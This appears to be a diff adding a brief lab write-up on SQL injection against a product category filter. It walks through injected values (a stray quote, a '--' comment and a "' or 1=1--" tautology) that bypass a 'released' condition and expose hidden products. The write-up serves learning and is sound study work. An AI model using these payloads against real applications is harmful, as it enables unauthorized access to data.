@@ -1,0 +1,17 @@
+SQL injection - Product category filter
+
+Query that run in the backend: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+Goal: display details of all products in any category, both released and unreleased.
+
+Process:
+
+`SELECT * FROM products WHERE category = 'Pets' AND released = 1`
+
+`SELECT * FROM products WHERE category = ''' AND released = 1` - error occured
+
+`SELECT * FROM products WHERE category = ''--' AND released = 1` - commented out the other part of the condiotion.
+
+`SELECT * FROM products WHERE category = 'Pets'--' AND released = 1` - relesed all the products where filter is `Pets`, show all both released and unrelesead.
+
+`SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1` - End goal!
